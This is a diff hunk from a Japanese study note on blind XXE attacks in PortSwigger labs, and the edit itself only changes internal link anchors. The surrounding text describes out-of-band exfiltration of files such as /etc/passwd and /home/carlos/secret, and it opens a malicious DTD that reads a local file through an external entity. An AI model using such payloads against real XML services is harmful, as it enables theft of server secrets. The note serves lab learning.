@@ -113,12 +113,12 @@ Content-Type: text/plain; charset=utf-8
 - `/etc/passwd`のような、出力に改行文字を含むものは取得できないケースがある
 - 改行文字を含まない他の機密情報(`/home/carlos/secret`等）を取得してみる
 - もしくはHTTPの代わりにFTPプロトコルを使用してみる。(PortSwiggerでは無いシナリオ)
-- or [⚡️XXEi](⚡️XXEi.md#DTD%20Blind%20Error%20messages)
+- or [⚡️XXEi](#DTD%20Blind%20Error%20messages)
 
 ---
 #### DTD Blind Error messages
 
-[⚡️XXEi](⚡️XXEi.md#DTD%20Blind%20Out-of-band)が無理だった時
+[⚡️XXEi](#DTD%20Blind%20Out-of-band)が無理だった時
 1. エクスプロイトサーバに以下をホストする(File: `/exploit.dtd`)
 ```dtd
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
